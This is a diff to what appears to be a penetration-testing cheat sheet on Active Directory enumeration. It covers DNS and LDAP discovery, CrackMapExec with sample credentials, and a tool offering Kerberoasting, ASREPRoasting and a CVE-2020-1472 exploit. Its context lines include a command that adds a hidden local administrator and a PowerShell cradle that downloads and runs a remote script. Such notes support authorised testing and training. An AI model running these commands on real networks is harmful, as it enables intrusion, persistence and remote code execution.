@@ -20,6 +20,10 @@ They are usually DNS Servers. They have usually LDAP listening port 389.
 
 ```bash
 nmap -p53,389 $network_ip
+
+nmcli dev show eth0/interface
+
+nslookup -type=SRV _ldap._tcp.dc.msdcs.<domain.local>
 ```
 
 ## Enumerate alive machines
@@ -54,13 +58,15 @@ enum4linux -G 0.0.0.0
 enum4linux -S 0.0.0.0
 ```
 
-### `crackmapexec` | https://github.com/byt3bl33d3r/CrackMapExec
+### `crackmapexec`
 
-Post-exploitation tool that helps automate assessing the security of large Active Directory networks.
+> Post-exploitation tool that helps automate assessing the security of large Active Directory networks.
+
+{% embed url="https://github.com/byt3bl33d3r/CrackMapExec" %}
 
 #### Installation
 
-https://mpgn.gitbook.io/crackmapexec/getting-started/installation/installation-on-unix
+{% embed url="https://mpgn.gitbook.io/crackmapexec/getting-started/installation/installation-on-unix" %}
 
 ```bash
 # only in upgraded Windows servers from 2003 - No auth attempt
@@ -75,7 +81,7 @@ crackmapexec smb 10.10.10.161 -u svc-alfresco -p s3rvice --shares
 
 ### UO | Users Enumeration
 
-```powershell
+```bash
 GetADUsers.py $domain/ -dc-ip $ip
 
 # More infos with rpcclient
@@ -94,4 +100,28 @@ net user anon p3nT3st! /add;net localgroup administrators anon /add
 
 If you cannot import module start a webserver and
 IEX(New-Object Net.Webclient).downloadstring('http://<IP>/Powershell.ps1')
+```
+
+## Tools
+
+### AD Enum
+
+* ASREPRoasting
+* Kerberoasting
+* Dump AD as BloodHound JSON files
+* Searching GPOs in SYSVOL for cpassword and decrypting
+* Run without creds and attempt to gather for further enumeration during the run
+* Sample exploits included:
+  * CVE-2020-1472
+
+{% embed url="https://github.com/CasperGN/ActiveDirectoryEnumeration" %}
+
+### Install
+
+```bash
+pip3 install ActiveDirectoryEnum
+python -m ade
+
+# query exploit for poc
+python -m ade --exploit cve-2020-1472
 ```
